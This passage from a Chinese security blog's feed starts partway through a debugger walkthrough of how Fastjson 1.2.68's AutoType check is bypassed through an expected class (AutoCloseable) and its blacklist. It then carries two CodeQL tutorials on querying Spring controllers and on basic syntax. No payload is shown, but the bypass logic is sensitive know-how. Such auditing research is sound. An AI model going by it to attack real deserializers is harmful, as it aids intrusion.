&quot;long&quot;&quot;java.lang.VerifyError&quot; -&gt; {Class@674} &quot;class java.lang.VerifyError&quot;&quot;java.util.LinkedHashMap&quot; -&gt; {Class@95} &quot;class java.util.LinkedHashMap&quot;&quot;java.util.Calendar&quot; -&gt; {Class@731} &quot;class java.util.Calendar&quot;&quot;java.lang.StackTraceElement&quot; -&gt; {Class@673} &quot;class java.lang.StackTraceElement&quot;&quot;[long&quot; -&gt; {Class@331} &quot;class [J&quot;&quot;java.lang.NoSuchMethodError&quot; -&gt; {Class@196} &quot;class java.lang.NoSuchMethodError&quot;&quot;java.util.concurrent.atomic.AtomicLong&quot; -&gt; {Class@103} &quot;class java.util.concurrent.atomic.AtomicLong&quot;&quot;java.util.TreeMap&quot; -&gt; {Class@676} &quot;class java.util.TreeMap&quot;&quot;java.util.Date&quot; -&gt; {Class@643} &quot;class java.util.Date&quot;&quot;java.lang.NoSuchFieldError&quot; -&gt; {Class@620} &quot;class java.lang.NoSuchFieldError&quot;&quot;java.util.concurrent.atomic.AtomicInteger&quot; -&gt; {Class@173} &quot;class java.util.concurrent.atomic.AtomicInteger&quot;&quot;java.lang.Short&quot; -&gt; {Class@354} &quot;class java.lang.Short&quot;&quot;java.util.Locale&quot; -&gt; {Class@40} &quot;class java.util.Locale&quot;&quot;java.lang.InstantiationException&quot; -&gt; {Class@722} &quot;class java.lang.InstantiationException&quot;&quot;java.lang.SecurityException&quot; -&gt; {Class@672} &quot;class java.lang.SecurityException&quot;&quot;java.sql.Timestamp&quot; -&gt; {Class@656} &quot;class java.sql.Timestamp&quot;&quot;java.util.concurrent.ConcurrentHashMap&quot; -&gt; {Class@36} &quot;class java.util.concurrent.ConcurrentHashMap&quot;&quot;java.util.UUID&quot; -&gt; {Class@708} &quot;class java.util.UUID&quot;&quot;java.lang.IllegalAccessError&quot; -&gt; {Class@717} &quot;class java.lang.IllegalAccessError&quot;&quot;com.alibaba.fastjson.JSONObject&quot; -&gt; {Class@583} &quot;class com.alibaba.fastjson.JSONObject&quot;&quot;[short&quot; -&gt; {Class@333} &quot;class [S&quot;&quot;java.util.HashSet&quot; -&gt; {Class@391} &quot;class java.util.HashSet&quot;&quot;[byte&quot; -&gt; {Class@334} &quot;class [B&quot;&quot;java.lang.Boolean&quot; -&gt; {Class@264} &quot;class java.lang.Boolean&quot;&quot;java.sql.Date&quot; -&gt; {Class@654} &quot;class java.sql.Date&quot;&quot;short&quot; -&gt; {Class@884} &quot;short&quot;&quot;java.lang.Object&quot; -&gt; {Class@330} &quot;class java.lang.Object&quot;&quot;java.util.BitSet&quot; -&gt; {Class@41} &quot;class java.util.BitSet&quot;&quot;[char&quot; -&gt; {Class@337} &quot;class [C&quot;&quot;java.lang.Float&quot; -&gt; {Class@261} &quot;class java.lang.Float&quot;&quot;java.math.BigDecimal&quot; -&gt; {Class@569} &quot;class java.math.BigDecimal&quot;&quot;java.lang.Character&quot; -&gt; {Class@263} &quot;class java.lang.Character&quot;&quot;java.lang.InternalError&quot; -&gt; {Class@340} &quot;class java.lang.InternalError&quot;&quot;[double&quot; -&gt; {Class@335} &quot;class [D&quot;&quot;byte&quot; -&gt; {Class@899} &quot;byte&quot;&quot;double&quot; -&gt; {Class@901} &quot;double&quot;&quot;java.lang.Exception&quot; -&gt; {Class@316} &quot;class java.lang.Exception&quot;&quot;java.lang.Double&quot; -&gt; {Class@260} &quot;class java.lang.Double&quot;&quot;[B&quot; -&gt; {Class@334} &quot;class [B&quot;&quot;java.lang.TypeNotPresentException&quot; -&gt; {Class@647} &quot;class java.lang.TypeNotPresentException&quot;&quot;[C&quot; -&gt; {Class@337} &quot;class [C&quot;&quot;[D&quot; -&gt; {Class@335} &quot;class [D&quot;&quot;java.text.SimpleDateFormat&quot; -&gt; {Class@721} &quot;class java.text.SimpleDateFormat&quot;&quot;[F&quot; -&gt; {Class@336} &quot;class [F&quot;&quot;[I&quot; -&gt; {Class@332} &quot;class [I&quot;&quot;java.util.TreeSet&quot; -&gt; {Class@652} &quot;class java.util.TreeSet&quot;&quot;[J&quot; -&gt; {Class@331} &quot;class [J&quot;&quot;java.util.ArrayList&quot; -&gt; {Class@215} &quot;class java.util.ArrayList&quot;&quot;java.lang.IllegalMonitorStateException&quot; -&gt; {Class@305} &quot;class java.lang.IllegalMonitorStateException&quot;&quot;com.alibaba.fastjson.JSONArray&quot; -&gt; {Class@723} &quot;class com.alibaba.fastjson.JSONArray&quot;&quot;[S&quot; -&gt; {Class@333} &quot;class [S&quot;&quot;java.lang.String&quot; -&gt; {Class@326} &quot;class java.lang.String&quot;&quot;java.lang.Number&quot; -&gt; {Class@262} &quot;class java.lang.Number&quot;&quot;java.util.LinkedHashSet&quot; -&gt; {Class@675} &quot;class java.util.LinkedHashSet&quot;&quot;[Z&quot; -&gt; {Class@338} &quot;class [Z&quot;&quot;java.lang.NegativeArraySizeException&quot; -&gt; {Class@724} &quot;class java.lang.NegativeArraySizeException&quot;&quot;java.lang.NumberFormatException&quot; -&gt; {Class@648} &quot;class java.lang.NumberFormatException&quot;&quot;java.lang.RuntimeException&quot; -&gt; {Class@315} &quot;class java.lang.RuntimeException&quot;&quot;char&quot; -&gt; {Class@925} &quot;char&quot;&quot;java.lang.OutOfMemoryError&quot; -&gt; {Class@307} &quot;class java.lang.OutOfMemoryError&quot;&quot;java.lang.IllegalStateException&quot; -&gt; {Class@614} &quot;class java.lang.IllegalStateException&quot;&quot;java.sql.Time&quot; -&gt; {Class@658} &quot;class java.sql.Time&quot;&quot;java.lang.NoSuchMethodException&quot; -&gt; {Class@683} &quot;class java.lang.NoSuchMethodException&quot;&quot;java.util.Collections$EmptyMap&quot; -&gt; {Class@208} &quot;class java.util.Collections$EmptyMap&quot;&quot;[boolean&quot; -&gt; {Class@338} &quot;class [Z&quot;&quot;float&quot; -&gt; {Class@935} &quot;float&quot;&quot;java.lang.AutoCloseable&quot; -&gt; {Class@275} &quot;interface java.lang.AutoCloseable&quot;&quot;java.lang.NullPointerException&quot; -&gt; {Class@250} &quot;class java.lang.NullPointerException&quot;&quot;java.lang.Byte&quot; -&gt; {Class@259} &quot;class java.lang.Byte&quot;&quot;[int&quot; -&gt; {Class@332} &quot;class [I&quot;&quot;com.alibaba.fastjson.JSONPObject&quot; -&gt; {Class@671} &quot;class com.alibaba.fastjson.JSONPObject&quot;&quot;java.lang.Cloneable&quot; -&gt; {Class@321} &quot;interface java.lang.Cloneable&quot;&quot;java.lang.IllegalAccessException&quot; -&gt; {Class@664} &quot;class java.lang.IllegalAccessException&quot;&quot;java.util.IdentityHashMap&quot; -&gt; {Class@720} &quot;class java.util.IdentityHashMap&quot;&quot;java.util.HashMap&quot; -&gt; {Class@192} &quot;class java.util.HashMap&quot;&quot;java.lang.NoClassDefFoundError&quot; -&gt; {Class@667} &quot;class java.lang.NoClassDefFoundError&quot;&quot;java.util.Hashtable&quot; -&gt; {Class@290} &quot;class java.util.Hashtable&quot;&quot;java.util.WeakHashMap&quot; -&gt; {Class@166} &quot;class java.util.WeakHashMap&quot;&quot;java.lang.IllegalThreadStateException&quot; -&gt; {Class@701} &quot;class java.lang.IllegalThreadStateException&quot;&quot;java.lang.IllegalArgumentException&quot; -&gt; {Class@73} &quot;class java.lang.IllegalArgumentException&quot;&quot;int&quot; -&gt; {Class@950} &quot;int&quot;&quot;java.util.concurrent.TimeUnit&quot; -&gt; {Class@397} &quot;class java.util.concurrent.TimeUnit&quot;&quot;boolean&quot; -&gt; {Class@953} &quot;boolean&quot;&quot;java.lang.InstantiationError&quot; -&gt; {Class@645} &quot;class java.lang.InstantiationError&quot;&quot;java.lang.InterruptedException&quot; -&gt; {Class@216} &quot;class java.lang.InterruptedException&quot;&quot;[float&quot; -&gt; {Class@336} &quot;class [F&quot;</code></pre><p><img src="/img/Fastjson1268AutoType/image-20220525170049125.png" alt="image-20220525170049125"></p><p>到这里，依然还没有出现<code>SupportAutoType</code>的校验，但已经可以返回类了。</p><p>然后进入到</p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.java</p><p><img src="/img/Fastjson1268AutoType/image-20220525170331080.png" alt="image-20220525170331080"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java</p><p><img src="/img/Fastjson1268AutoType/image-20220525170413552.png" alt="image-20220525170413552"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java</p><p>创建了JavaBeanDeserializer</p><p><img src="/img/Fastjson1268AutoType/image-20220525170503999.png" alt="image-20220525170503999"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.java</p><p><img src="/img/Fastjson1268AutoType/image-20220525170801192.png" alt="image-20220525170801192"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java</p><p>进入到JavaBeanDeserializer的<code>checkAutoType</code>里</p><p><img src="/img/Fastjson1268AutoType/image-20220525170949996.png" alt="image-20220525170949996"></p><p>此时的checkAutoType参数传递进了期望类</p><p><img src="/img/Fastjson1268AutoType/image-20220525171244691.png" alt="image-20220525171244691"></p><p>前面的步骤都一致，因为这时候的期望类为AutoCloseable，所以即不为空，也不再黑名单里。所以将标志设置为True</p><p><img src="/img/Fastjson1268AutoType/image-20220525171353499.png" alt="image-20220525171353499"></p><p>com.DemoFastjson.Demo1_2_68.Test1不在内部白名单里，所以不进入if条件里</p><p><img src="/img/Fastjson1268AutoType/image-20220525172121558.png" alt="image-20220525172121558"></p><p>接下来就是判断要反序列化的类是否是危险的链，如果不在denyHashCodes黑名单里，则说明是安全的链，可以被反序列化</p><p><img src="/img/Fastjson1268AutoType/image-20220525173123382.png" alt="image-20220525173123382"></p><p>上述证明了该类是安全的，于是通过下面的几种方式去寻找该类</p><p><img src="/img/Fastjson1268AutoType/image-20220525173305634.png" alt="image-20220525173305634"></p><p>当autoType关闭的时候，也是去检测是否是在黑名单里。和上面的判断一样</p><p><img src="/img/Fastjson1268AutoType/image-20220525173753048.png" alt="image-20220525173753048"></p><p>因为是期望类了，所以要去加载反序列化的类</p><p><img src="/img/Fastjson1268AutoType/image-20220525174209305.png" alt="image-20220525174209305"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/util/TypeUtils.java</p><p>直接加载了本地的类</p><p><img src="/img/Fastjson1268AutoType/image-20220525174314360.png" alt="image-20220525174314360"></p><p>此时clazz已经有值了</p><p><img src="/img/Fastjson1268AutoType/image-20220525174347656.png" alt="image-20220525174347656"></p><p>判断是不是继承/实现了<code>ClassLoader</code>、<code>DataSource</code> 、<code>RowSet</code>这些类，如果是的话则抛出异常。</p><p><img src="/img/Fastjson1268AutoType/image-20220525174520229.png" alt="image-20220525174520229"></p><p><strong>如果反序列化的类继承或者实现了期望类的话，那么就加入到缓存里，并且返回反序列化类</strong></p><p><img src="/img/Fastjson1268AutoType/image-20220525174716535.png" alt="image-20220525174716535"></p><p>成功返回指定的反序列化类</p><p><img src="/img/Fastjson1268AutoType/image-20220525174827611.png" alt="image-20220525174827611"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java</p><p><img src="/img/Fastjson1268AutoType/image-20220525174909151.png" alt="image-20220525174909151"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java</p><p>创建JavaBeanDeserializer</p><p><img src="/img/Fastjson1268AutoType/image-20220525174945542.png" alt="image-20220525174945542"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java</p><p>反序列化</p><p><img src="/img/Fastjson1268AutoType/image-20220525175100121.png" alt="image-20220525175100121"></p><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java</p><p>进入到createInstance</p><p><img src="/img/Fastjson1268AutoType/image-20220525203429187.png" alt="image-20220525203429187"></p><p>链路如下</p><pre><code>createInstance:189, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:826, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:288, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:284, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:808, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:288, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:284, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1401, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1367, DefaultJSONParser (com.alibaba.fastjson.parser)parse:183, JSON (com.alibaba.fastjson)parse:193, JSON (com.alibaba.fastjson)parse:149, JSON (com.alibaba.fastjson)main:20, Demo1_2_68 (com.DemoFastjson.Demo1_2_68)</code></pre><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/http://screwsec.com/2020/06/27/Fastjson-1.2.68-AutoType%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/https://mp.weixin.qq.com/s/easeaxR2IJRyAzbqZBo2xg</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Fastjson1.2.68 AutoType绕过分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL系列之Spring</title>
      <link href="/2022/01/04/codeql-xi-lie-zhi-spring/"/>
      <url>/2022/01/04/codeql-xi-lie-zhi-spring/</url>
      
        <content type="html"><![CDATA[<h1 id="CodeQL系列之Spring"><a href="#CodeQL系列之Spring" class="headerlink" title="CodeQL系列之Spring"></a>CodeQL系列之Spring</h1><h2 id="SpringController和SpringRestController"><a href="#SpringController和SpringRestController" class="headerlink" title="SpringController和SpringRestController"></a>SpringController和SpringRestController</h2><p><strong>一种就是传统的web的那种controller，而另外一种就是REST类型的controller。</strong></p><p><code>@Controller</code> 通常是被使用服务于web 页面的。默认，你的controller方法返回的是一个string 串，是表示要展示哪个模板页面或者是要跳转到哪里去。</p><p><code>@RestController</code> 就是专门用在编写API的时候，特别那种返回一个JSON，或者是XML等等。然后方法返回的是可以是一个对象，是一个可以被序列化的对象。</p><p>SpringController返回的是注解为@Controller</p><p>SpringRestController返回的是注解为@RestController</p><p><img src="/img/CodeQLSpring/image-20220105112858778.png" alt="image-20220105112858778"></p><p>例子</p><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerfrom SpringController var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220715174129859.png" alt="image-20220715174129859"></p><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerfrom SpringRestController var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220715174042741.png" alt="image-20220715174042741"></p><h3 id="SpringControllerMethod"><a href="#SpringControllerMethod" class="headerlink" title="SpringControllerMethod"></a>SpringControllerMethod</h3><h4 id="返回方法"><a href="#返回方法" class="headerlink" title="返回方法"></a>返回方法</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerfrom SpringControllerMethod methodselect method, method.getFile(), method.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220715174332349.png" alt="image-20220715174332349"></p><h3 id="SpringRequestMappingAnnotation"><a href="#SpringRequestMappingAnnotation" class="headerlink" title="SpringRequestMappingAnnotation"></a>SpringRequestMappingAnnotation</h3><h4 id="获取路由注解，可以匹配到-RequestMapping、-GetMapping、-PostMapping"><a href="#获取路由注解，可以匹配到-RequestMapping、-GetMapping、-PostMapping" class="headerlink" title="获取路由注解，可以匹配到@RequestMapping、@GetMapping、@PostMapping"></a>获取路由注解，可以匹配到@RequestMapping、@GetMapping、@PostMapping</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerprivate class SpringRequestMappingAnnotation extends Annotation {    SpringRequestMappingAnnotation() { this.getType() instanceof SpringRequestMappingAnnotationType }}from SpringRequestMappingAnnotation var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220715174635918.png" alt="image-20220715174635918"></p><p><img src="/img/CodeQLSpring/image-20220715174615739.png" alt="image-20220715174615739"></p><h3 id="Annotation-getAnAnnotation"><a href="#Annotation-getAnAnnotation" class="headerlink" title="Annotation.getAnAnnotation"></a>Annotation.getAnAnnotation</h3><h4 id="获取注解"><a href="#获取注解" class="headerlink" title="获取注解"></a>获取注解</h4><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom SpringRequestMappingAnnotationType var2select var2.getAnAnnotation(), var2.getFile(), var2.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220715175027020.png" alt="image-20220715175027020"></p><h3 id="Annotation-getAnnotatedElement"><a href="#Annotation-getAnnotatedElement" class="headerlink" title="Annotation.getAnnotatedElement"></a>Annotation.getAnnotatedElement</h3><h4 id="获取注解下的方法"><a href="#获取注解下的方法" class="headerlink" title="获取注解下的方法"></a>获取注解下的方法</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerprivate class SpringRequestMappingAnnotation extends Annotation {    SpringRequestMappingAnnotation() { this.getType() instanceof SpringRequestMappingAnnotationType }}from SpringRequestMappingAnnotation var1select var1, var1.getAnnotatedElement()</code></pre><p><img src="/img/CodeQLSpring/image-20220715175223397.png" alt="image-20220715175223397"></p><h3 id="Annotation-getValue"><a href="#Annotation-getValue" class="headerlink" title="Annotation.getValue"></a>Annotation.getValue</h3><h4 id="Annotation-getValue-“value”-获取注解里key为value的值，如果注解里没有key，则默认key为value"><a href="#Annotation-getValue-“value”-获取注解里key为value的值，如果注解里没有key，则默认key为value" class="headerlink" title="Annotation.getValue(“value”) 获取注解里key为value的值，如果注解里没有key，则默认key为value"></a>Annotation.getValue(“value”) 获取注解里key为value的值，如果注解里没有key，则默认key为value</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerprivate class SpringRequestMappingAnnotation extends Annotation {    SpringRequestMappingAnnotation() { this.getType() instanceof SpringRequestMappingAnnotationType }}from SpringRequestMappingAnnotation var1select var1, var1.getValue(&quot;value&quot;)</code></pre><p><img src="/img/CodeQLSpring/image-20220715175340672.png" alt="image-20220715175340672"></p><h3 id="SpringRequestMappingMethod"><a href="#SpringRequestMappingMethod" class="headerlink" title="SpringRequestMappingMethod"></a>SpringRequestMappingMethod</h3><h4 id="获取路由方法"><a href="#获取路由方法" class="headerlink" title="获取路由方法"></a>获取路由方法</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerfrom SpringRequestMappingMethod var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220804113126155.png" alt="image-20220804113126155"></p><h3 id="SpringRequestMappingParameter"><a href="#SpringRequestMappingParameter" class="headerlink" title="SpringRequestMappingParameter"></a>SpringRequestMappingParameter</h3><h4 id="获取路由参数"><a href="#获取路由参数" class="headerlink" title="获取路由参数"></a>获取路由参数</h4><pre><code>import javaimport semmle.code.java.frameworks.spring.SpringControllerfrom SpringRequestMappingParameter var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLSpring/image-20220804113251641.png" alt="image-20220804113251641"></p>]]></content>
      
      
      <categories>
          
          <category> CodeQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL系列之Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL系列之基础语法</title>
      <link href="/2021/12/30/codeql-xi-lie-zhi-ji-chu-yu-fa/"/>
      <url>/2021/12/30/codeql-xi-lie-zhi-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="CodeQL系列之基础语法"><a href="#CodeQL系列之基础语法" class="headerlink" title="CodeQL系列之基础语法"></a>CodeQL系列之基础语法</h1><h2 id="0x01-语法规则"><a href="#0x01-语法规则" class="headerlink" title="0x01 语法规则"></a>0x01 语法规则</h2><pre><code>import &lt;language&gt; /* 导入对应的语言包 *//* 一些谓词、类的设置 即定义一些方法或者类*/from /* 声明变量等 即定义各种变量*/where /* 设置逻辑表达式 即代码逻辑*/select /* 打印结果 即输出*/</code></pre><h2 id="0x02-常用的一些方法"><a href="#0x02-常用的一些方法" class="headerlink" title="0x02 常用的一些方法"></a>0x02 常用的一些方法</h2><h3 id="0x02-1-Field"><a href="#0x02-1-Field" class="headerlink" title="0x02-1 Field"></a>0x02-1 Field</h3><h6 id="类或者实例的字段"><a href="#类或者实例的字段" class="headerlink" title="类或者实例的字段"></a>类或者实例的字段</h6><pre><code>import javafrom Field fselect f</code></pre><p><img src="/img/CodeQLBase/image-20220607170137144.png" alt="image-20220607170137144"></p><p><img src="/img/CodeQLBase/image-20220607170242714.png" alt="image-20220607170242714"></p><h3 id="0x02-2-一些常见后缀的含义"><a href="#0x02-2-一些常见后缀的含义" class="headerlink" title="0x02-2 一些常见后缀的含义"></a>0x02-2 一些常见后缀的含义</h3><p>XXXType是类型：IntegralType</p><p>XXXStmt是语句：ReturnStmt、SwitchStmt、IfStmt</p><p>XXXLiteral是类型：StringLiteral、IntegerLiteral、NullLiteral</p><p>TypeString 是字符串类型</p><h3 id="0x02-3-predicate"><a href="#0x02-3-predicate" class="headerlink" title="0x02-3 predicate"></a>0x02-3 predicate</h3><h6 id="定义没有返回类型的谓词（也就是方法）"><a href="#定义没有返回类型的谓词（也就是方法）" class="headerlink" title="定义没有返回类型的谓词（也就是方法）"></a>定义没有返回类型的谓词（也就是方法）</h6><p><img src="/img/CodeQLBase/image-20220103212829892.png" alt="image-20220103212829892"></p><h3 id="0x02-4-result"><a href="#0x02-4-result" class="headerlink" title="0x02-4 result"></a>0x02-4 result</h3><h6 id="可以理解为函数的返回值"><a href="#可以理解为函数的返回值" class="headerlink" title="可以理解为函数的返回值"></a>可以理解为函数的返回值</h6><pre><code>int test(){    result = 5}select test()</code></pre><p><img src="/img/CodeQLBase/image-20220112143351715.png" alt="image-20220112143351715"></p><h3 id="0x02-5-bindingset"><a href="#0x02-5-bindingset" class="headerlink" title="0x02-5 bindingset"></a>0x02-5 bindingset</h3><h6 id="函数有参数时，需要绑定"><a href="#函数有参数时，需要绑定" class="headerlink" title="函数有参数时，需要绑定"></a>函数有参数时，需要绑定</h6><pre><code>bindingset[a, b]int test(int a, int b){    result = a + b}select test(1, 2)</code></pre><p><img src="/img/CodeQLBase/image-20220112143530039.png" alt="image-20220112143530039"></p><h3 id="0x02-6-getDeclaringType"><a href="#0x02-6-getDeclaringType" class="headerlink" title="0x02-6 getDeclaringType"></a>0x02-6 getDeclaringType</h3><h6 id="获取匹配到的元素是在哪个类里定义的"><a href="#获取匹配到的元素是在哪个类里定义的" class="headerlink" title="获取匹配到的元素是在哪个类里定义的"></a>获取匹配到的元素是在哪个类里定义的</h6><pre><code>import javafrom Field f, FieldRead readwhere  f.hasName(&quot;chastityUtil&quot;) and  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.audit&quot;, &quot;AuditAuthController&quot;) and  f = read.getField()select f.getDeclaration()</code></pre><p><img src="/img/CodeQLBase/image-20220607165019525.png" alt="image-20220607165019525"></p><h3 id="0x02-7-getName"><a href="#0x02-7-getName" class="headerlink" title="0x02-7 getName"></a>0x02-7 getName</h3><h6 id="获取匹配到的元素的名字"><a href="#获取匹配到的元素的名字" class="headerlink" title="获取匹配到的元素的名字"></a>获取匹配到的元素的名字</h6><pre><code>import javafrom Field f, FieldRead readwhere  f.hasName(&quot;chastityUtil&quot;) and  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.audit&quot;, &quot;AuditAuthController&quot;) and  f = read.getField()select f, f.getName()</code></pre><p><img src="/img/CodeQLBase/image-20220607163454754.png" alt="image-20220607163454754"></p><h3 id="0x02-8-getLocation"><a href="#0x02-8-getLocation" class="headerlink" title="0x02-8 getLocation"></a>0x02-8 getLocation</h3><h6 id="获取匹配到的元素所在文件的路径"><a href="#获取匹配到的元素所在文件的路径" class="headerlink" title="获取匹配到的元素所在文件的路径"></a>获取匹配到的元素所在文件的路径</h6><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom Call call, Callable parseExpressionwhere    call.getCallee() = parseExpression and    parseExpression.getDeclaringType().hasQualifiedName(&quot;com.alibaba.fastjson&quot;, &quot;JSON&quot;) and    parseExpression.hasName(&quot;parseObject&quot;)select call.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220607164340888.png" alt="image-20220607164340888"></p><h3 id="0x02-9-getType"><a href="#0x02-9-getType" class="headerlink" title="0x02-9 getType"></a>0x02-9 getType</h3><h6 id="获取匹配到的元素的类型"><a href="#获取匹配到的元素的类型" class="headerlink" title="获取匹配到的元素的类型"></a>获取匹配到的元素的类型</h6><pre><code>import javafrom Field f, FieldRead readwhere  f.hasName(&quot;chastityUtil&quot;) and  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.audit&quot;, &quot;AuditAuthController&quot;) and  f = read.getField()select f.getType()</code></pre><p><img src="/img/CodeQLBase/image-20220607165609775.png" alt="image-20220607165609775"></p><h3 id="0x02-10-exists"><a href="#0x02-10-exists" class="headerlink" title="0x02-10 exists"></a>0x02-10 exists</h3><h6 id="判断语句里是否为True"><a href="#判断语句里是否为True" class="headerlink" title="判断语句里是否为True"></a>判断语句里是否为True</h6><p>下面的例子因为a不等于b，所以exists的结果为False，所以select为空</p><pre><code>import javafrom int awhere    a = 9 and    exists(int b |         b = 8 and         a = b    ) select a</code></pre><p><img src="/img/CodeQLBase/image-20220607174607190.png" alt="image-20220607174607190"></p><p>下面的例子因为a等于b，所以exists的结果为True，所以select打印了a</p><p><img src="/img/CodeQLBase/image-20220607174645657.png" alt="image-20220607174645657"></p><h3 id="0x02-11-Expr"><a href="#0x02-11-Expr" class="headerlink" title="0x02-11 Expr"></a>0x02-11 Expr</h3><h6 id="表示各种表达式的通用超类。"><a href="#表示各种表达式的通用超类。" class="headerlink" title="表示各种表达式的通用超类。"></a>表示各种表达式的通用超类。</h6><p><img src="/img/CodeQLBase/image-20211230211724488.png" alt="image-20211230211724488"></p><h3 id="0x02-12-hasQualifiedName"><a href="#0x02-12-hasQualifiedName" class="headerlink" title="0x02-12 hasQualifiedName"></a>0x02-12 hasQualifiedName</h3><h6 id="个人理解：has（是的意思），QualifiedName是全称的意思，即判断某类的全称是什么，那么就要完整的包名和类名了。"><a href="#个人理解：has（是的意思），QualifiedName是全称的意思，即判断某类的全称是什么，那么就要完整的包名和类名了。" class="headerlink" title="个人理解：has（是的意思），QualifiedName是全称的意思，即判断某类的全称是什么，那么就要完整的包名和类名了。"></a>个人理解：has（是的意思），QualifiedName是全称的意思，即判断某类的全称是什么，那么就要完整的包名和类名了。</h6><p><img src="/img/CodeQLBase/image-20211230213344882.png" alt="image-20211230213344882"></p><pre><code>import javafrom Field fwhere  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.audit&quot;, &quot;AuditAuthController&quot;) select f</code></pre><p><img src="/img/CodeQLBase/image-20220607175208710.png" alt="image-20220607175208710"></p><p>打印出了AuditAuthController类的所有Field</p><p><img src="/img/CodeQLBase/image-20220607175244459.png" alt="image-20220607175244459"></p><h3 id="0x02-13-BooleanLiteral"><a href="#0x02-13-BooleanLiteral" class="headerlink" title="0x02-13 BooleanLiteral"></a>0x02-13 BooleanLiteral</h3><h6 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h6><p>BooleanLiteral 的值为true or false</p><p><img src="/img/CodeQLBase/image-20220103152621465.png" alt="image-20220103152621465"></p><h3 id="0x02-14-getFile"><a href="#0x02-14-getFile" class="headerlink" title="0x02-14 getFile"></a>0x02-14 getFile</h3><h6 id="获取匹配到的元素所在的文件"><a href="#获取匹配到的元素所在的文件" class="headerlink" title="获取匹配到的元素所在的文件"></a>获取匹配到的元素所在的文件</h6><pre><code>import javafrom Field fwhere  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.audit&quot;, &quot;AuditAuthController&quot;) select f.getFile()</code></pre><p><img src="/img/CodeQLBase/image-20220607175402156.png" alt="image-20220607175402156"></p><h3 id="0x02-15-数据类型"><a href="#0x02-15-数据类型" class="headerlink" title="0x02-15 数据类型"></a>0x02-15 数据类型</h3><p>StringLiteral、IntegerLiteral、NullLiteral等</p><p>StringLiteral –&gt; 字符串类型</p><p>IntegerLiteral –&gt; 数字类型</p><p>NullLiteral –&gt; 空类型</p><pre><code>import javafrom MethodAccess ma, Method methodwhere  ma.getMethod().overrides*(method) and  method.hasName(&quot;append&quot;) and  method.getDeclaringType().getSourceDeclaration().hasQualifiedName(&quot;java.lang&quot;, &quot;StringBuilder&quot;) and  ma.getAnArgument() instanceof StringLiteralselect ma, method, ma.getAnArgument()</code></pre><p>匹配到的元素的参数都是字符串类型</p><p><img src="/img/CodeQLBase/image-20220607194656559.png" alt="image-20220607194656559"></p><h3 id="0x02-16-concat"><a href="#0x02-16-concat" class="headerlink" title="0x02-16 concat"></a>0x02-16 concat</h3><h6 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h6><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom SpringRequestMappingMethod routewhere exists(route.getARequestParameter())select route, route.getValue(), concat(string s | s = route.getARequestParameter().toString() | s, &quot; &quot;)</code></pre><p><img src="/img/CodeQLBase/image-20220607194936284.png" alt="image-20220607194936284"></p><h3 